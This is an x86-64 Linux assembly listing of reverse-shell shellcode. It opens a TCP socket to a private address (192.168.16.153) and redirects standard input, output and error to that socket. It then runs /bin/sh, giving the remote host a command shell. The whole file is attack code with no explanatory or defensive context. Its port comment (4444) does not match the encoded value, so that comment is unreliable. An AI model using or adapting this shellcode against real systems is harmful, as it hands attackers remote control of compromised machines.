bits 64
global _start
section .text
_start:

push rbp
mov rbp,rsp
xor rdx, rdx
push 1
pop rsi
push 2
pop rdi
push 41
pop rax ; sys_socket
syscall
sub rsp, 8
mov dword [rsp], 0xc1df0002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
mov dword [rsp+4], 0x9910a8c0 ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
lea rsi, [rsp]
add rsp, 8
pop rbx
xor rbx, rbx
push 16
pop rdx
push 3
pop rdi
push 42
pop rax; sys_connect
syscall
xor rsi, rsi
shell_loop:
mov al, 33
syscall
inc rsi
cmp rsi, 2
jle shell_loop
xor rax, rax
xor rsi, rsi
mov rdi, 0x68732f6e69622f2f
push rsi
push rdi
mov rdi, rsp
xor rdx, rdx
mov al, 59
syscall
